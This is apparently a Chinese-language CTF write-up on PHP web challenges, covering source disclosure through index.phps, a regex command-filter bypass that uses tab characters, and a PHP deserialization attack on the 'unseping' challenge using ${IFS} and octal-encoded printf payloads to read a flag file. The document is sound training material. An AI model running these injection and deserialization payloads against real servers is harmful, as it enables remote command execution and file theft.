[TOC]

# web练习题

## PHP代码审计

### php2

进入题目只有一页面

![img](https://i-blog.csdnimg.cn/blog_migrate/edfb2fae806faa3e696856a0159c1dfc.png)

这里要用到**index.phps**来查看php的源代码。（连爆破字典里都没有爆破到）

后缀为phps的文件是存放php的源代码的，但是不是所有网站都有，只有特定的情况才有。

浏览器当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urldecode 。

故要对admin进行两次编码。

### 陇剑杯赛前检测

首先burp suite找到flag.php页面

之后得到

```php
      	<?php
      	if (isset($_GET['id']) && floatval($_GET['id']) !== '1' && $_GET['id'] == 1) //通过id=1.0或1e0可以绕过
      	{
      		echo 'welcome,admin';
      		$_SESSION['admin'] = True;
      	} 
      	else 
      	{
	        die('flag?');
      	}
      	?>

      	<?php
	     if ($_SESSION['admin']) 
	     {
	       if(isset($_POST['code']))
	       {
		       if(preg_match("/(ls|c|a|t| |f|i|n|d')/", $_POST['code'])==1)
			       echo 'no!';
		       elseif(preg_match("/[@#%^&*()|\/?><']/",$_POST['code'])==1)
			       echo 'no!';
			else
				system($_POST['code']);
	       }
	     }
	     ?>
```

发现：

- **第一个过滤**：`preg_match("/(ls|c|a|t| |f|i|n|d')/", $_POST['code'])` 阻止命令字符串中包含 `ls`、`c`、`a`、`t`、空格、`f`、`i`、`n` 或 `d'`。
- **第二个过滤**：`preg_match("/[@#%^&*()|\/?><']/", $_POST['code'])` 阻止命令字符串中包含 `@#%^&*()|\/?><'`

那么用制表符当空格，使用grep命令过滤

```
POST /?id=1e0 HTTP/1.1

Host: web-d11ea31914.challenge.longjiancup.cn

Cookie: PHPSESSID=admin123

Content-Type: application/x-www-form-urlencoded

Content-Length: 18


code=grep		-r	""	.
```

得到flag



## 反序列化漏洞

### unseping

源代码：

```php
<?php
highlight_file(__FILE__);
 
class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        //这是一个构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法
        $this->method = $method;
        $this->args = $args;
    }
 
    function __destruct(){
        //这是一个析构函数，它在对象被销毁时自动触发，通常用于清理资源或执行收尾操作。当对象生命周期结束（例如脚本结束、对象被 unset()、或没有任何引用时）会自动调用这个方法。
        
        if (in_array($this->method, array("ping"))) {
         	 //in_array(mixed $needle（要查找的值）, array $haystack（被搜索的数组）, bool $strict = false): bool
            call_user_func_array(array($this, $this->method), $this->args); //把一个数组里的参数，原封不动地传给指定的函数或方法并执行。
            //call_user_func_array(callable $callback（可调用的“东西”）, array $args（索引数组，里面的每个元素都会变成被调用函数的一个实参。）): mixed
            /*例：
            function add($a, $b) {
  			  return $a + $b;
			}
			echo call_user_func_array('add', [3, 5]);      // 8
            */
        }
    } //对象销毁时，如果指定了合法方法 "ping"，就自动调用 $this->ping(...$args) 做一次收尾动作。
 
    function ping($ip){
        exec($ip, $result);//把一条 shell 命令丢给操作系统去执行的函数
        //exec(string $command（要执行的完整 shell 命令（字符串））, array &$output = null（引用传参，用来接收命令输出的每一行）, int &$result_code = null（引用传参，用来接收命令的退出码）): string|false
        var_dump($result);//用于输出变量的详细信息，包括值和类型等
    }
 
    function waf($str){
        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
            //preg_match_all()：用于执行一个全局正则表达式匹配，一次性把所有符合正则的内容全部抓出来
            /*
            preg_match_all(
  			  	string  $pattern,      // 正则表达式，必须带定界符，如 /.../
				string  $subject,      // 要搜索的字符串
  				  array  &$matches = [], // 引用，用来存放结果
  				  int     $flags   = 0,  // 控制结果格式
   				 int     $offset  = 0   // 从第几个字节开始搜
				): int|false
*/
        } else {
            echo "don't hack";
        }
    }
 
    function __wakeup(){//unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源。
        foreach($this->args as $k => $v) {
            $this->args[$k] = $this->waf($v);
        }
    }   
}
 
$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));
?>
```

看到unserialize()就知道考的是反序列化

源代码执行顺序：

1. 以POST方式提交ctf
2. 对提交的值进行base64解码
3. 进行反序列化
4. 然后执行__wakeup()函数
5. 执行析构函数_destruct()

```php
<?php
class ease{
    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
}
 
$o=new ease("ping",array("ifconfig"));
$s = serialize($o);//生成一段内部表示的字符串，类似：
//O:4:"ease":2:{s:12:"easemethod";s:4:"ping";s:10:"easeargs";a:1:{i:0;s:7:"ifconfig";}}
echo base64_encode($s);
?>
```

上述代码可以得到命令的base64编码。

将上述base64编码结果以post形式提交进去。

接下来思路就放在命令执行绕过过滤即可。

![img](https://i-blog.csdnimg.cn/blog_migrate/0c1513f9052e56fa29f1a682ca1443e2.png)

看到了"flag_1s_here”文件夹，于是我们查看一下该文件夹下目录；于是执行命令"ls flag_1s_here"；**此处空格用${IFS}绕过。**

```php
<?php
class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
     
}
 
$o=new ease("ping",array('l""s${IFS}f""lag_1s_here'));
$s = serialize($o);
echo base64_encode($s);
?>
```

命令cat flag_1s_here/flag_831b69012c67b35f.php。

/绕过方式：**利用oct编码（八进制）绕过；$(printf "\154\163")//ls命令**

oct绕过：

```py
str1 = "cat flag_1s_here/flag_831b69012c67b35f.php"
arr = []
for i in str1:
    #对字符先转换为ASCII码，再转换为八进制
    r = oct(ord(i))
    #这个主要是为了将八进制前面的0o替换掉
    r=str(r).replace("0o","")
    arr.append(r)
s = "\\"
# print(arr)
#将所有的八进制组合，最终的结果第一个地方应该再添加一个\
p=s.join(arr)
print(p)
```

对执行后的结果再次进行base64编码

```php
<?php
class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
     
}
$o=new ease("ping",array('$(printf${IFS}"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")'));
$s = serialize($o);
 
echo base64_encode($s);
?>
```

代入得flag

